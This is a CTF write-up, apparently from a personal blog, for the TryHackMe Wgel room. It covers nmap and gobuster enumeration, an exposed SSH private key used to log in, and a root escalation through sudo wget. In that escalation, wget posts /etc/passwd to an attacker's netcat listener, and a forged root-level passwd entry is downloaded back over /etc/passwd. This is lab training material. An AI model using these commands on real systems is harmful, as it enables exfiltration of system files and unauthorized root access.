---
title: TryHackMe Wgel CTF [CHALLENGE]
date: 2024-03-13 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png
---

Can you exfiltrate the root flag? This room have network service pentesting, linux privilege escalation, directory busting bruteforcing.

## **Reconnaissance**
Initially do the Nmap scan.
```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```text
Nmap scan report for 10.10.120.57
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.48 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

TARGET IP: 10.10.120.57

80 → HTTP
- Apache httpd 2.4.18
- There is comment in the apache default web page source code that could perhaps a username.
- There is a user input in [/sitemap/contact](http://10.10.120.57/sitemap/contact.html)

22 → SSH
- Found id_rsa

## **Enumeration**
---
### 80 HTTP
We know that this contains the default apache web server page that shouts "It Works!". But let's not forget to inspect the source code to not miss things out!

![Desktop View](/assets/images/wgel-ctf/jessie.png){: width="972" height="589" }

Let us try scanning for other directories using gobuster. We also can’t do pretty much here.

```bash
gobuster dir -u http://10.10.120.57 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -k -t 30
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.120.57/sitemap/]
/server-status        (Status: 403) [Size: 277]
```

Upon inspecting the `/sitemap` webpage, we discovered that it accepts user input. However, after conducting basic [command injection](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology) and [directory traversal](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology) tests, it did not return any errors, which might indicate that the webpage is vulnerable to exploitation.


![Desktop View](/assets/images/wgel-ctf/contact.png){: width="972" height="589" }

Let us try doing some file busting and see if we can find something interesting.

```bash
gobuster dir -u http://10.10.120.57/sitemap/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30 
```

```text
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 21080]
/contact.html         (Status: 200) [Size: 10346]
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 21080]
/about.html           (Status: 200) [Size: 12232]
/.html                (Status: 403) [Size: 277]
/blog.html            (Status: 200) [Size: 12745]
/services.html        (Status: 200) [Size: 10131]
/shop.html            (Status: 200) [Size: 17257]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.120.57/sitemap/.ssh/]
/.DS_Store            (Status: 200) [Size: 14340]
/.htgroup             (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/work.html            (Status: 200) [Size: 11428]
/.htc                 (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
```
So, why do we have an exposed private key in the first place?

![Desktop View](/assets/images/wgel-ctf/privkey.png){: width="972" height="589" }

Question is, can this key be used by the username we just found from the source code?

## **Gaining an Initial Foothold**

```text
chmod 600 id_rsa
ssh -i id_rsa jessie@$IP
```
SSH private key file needs to be set with chmod 600 permissions to ensure that only the file owner can access the key while complying with SSH client security policies. Otherwise, it won't work.

![Desktop View](/assets/images/wgel-ctf/ssh.png){: width="972" height="589" }

> Do not forget to find the FLAGS
{: .prompt-danger }


## **Privilege Escalation**

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file.

![Desktop View](/assets/images/wgel-ctf/sudo.png){: width="972" height="589" }

The `wget` command is a versatile command-line tool that allows users to download one or several files at once from the internet or a server, utilizing various protocols such as HTTP, HTTPS, and FTP.

This implies that it is possible to download and modify the `/etc/passwd` file to insert a new user, thereby elevating our access privileges.

To start transferring the /etc/passwd to our attacking machine, we need to setup a typical netcat listener.

```bash
nc -lnvp <PORT> > <FILNAME>
```
![Desktop View](/assets/images/wgel-ctf/netcat.png){: width="972" height="589" }

On the target machine

```
sudo /usr/bin/wget --post-file=/etc/passwd <ATTACK_IP>:<PORT>
```
The --post-file flag enables wget to send the content of any file.

![Desktop View](/assets/images/wgel-ctf/wget.png){: width="972" height="589" }

From your attacking machine, you can view the extracted file and remove the http headers.

Once removed, generate a new hash password for a new root user in local machine.

```bash
openssl passwd -1 -salt thm password1
```

```bash
$1$thm$lQSjJL4ZZezfQn9UAZSqd1
```

Paste the generated hash to passwd.txt

```bash
echo 'jirho:$1$thm$lQSjJL4ZZezfQn9UAZSqd1:0:0:jirho:/home/jirho:/bin/bash' >> passwd.txt
```

From your attacker's machine working directory, setup a simple http server.

```bash
python3 -m http.server
```
On the target machine, get the file from your attacking machine

```bash
sudo /usr/bin/wget http://<ATTACK_MACHINE_IP>:<PORT>/passwd.txt -O /etc/passwd
```
Switch to the created user

```bash
su <USER>
password1 <-- enter the password you created from openssl
```
> Do not forget to find the FLAGS
{: .prompt-danger }

## **Materials/ References**

[Linux for Pentester: Wget Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)

[Sudo Wget Privilege Escalation Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)

![Desktop View](/assets/images/wgel-ctf/root.png){: width="972" height="589" }


## **Take Away Concepts**
- Never skip viewing the source code of the website regardless if it is the default Apache webpage, as it might contain hidden comments with user credentials.
- Conduct thorough directory and file busting. Who knows? Maybe someone left their SSH private keys unattended.
- Understand how wget works to escalate your privileges. Took me about an hour doing some trial and error on how to add a root user to the /etc/passwd using wget
- Username can be brute force using SSH.